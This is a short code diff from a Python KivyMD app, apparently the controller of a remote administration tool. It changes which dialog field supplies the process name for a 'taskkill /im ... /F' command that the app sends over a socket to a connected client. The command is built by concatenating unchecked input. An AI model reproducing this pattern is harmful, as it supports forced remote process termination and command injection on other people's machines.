@@ -498,7 +498,7 @@ class Main(MDApp):
 
     def ExecuteKillTask(self):
         while True:
-            command = 'taskkill /im ' + self.root.ids.idstaskKillProcessID.text + ' /F'
+            command = 'taskkill /im ' + self.killTaskDialog.content_cls.ids.taskKillProcessID.text + ' /F'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(8096).decode()
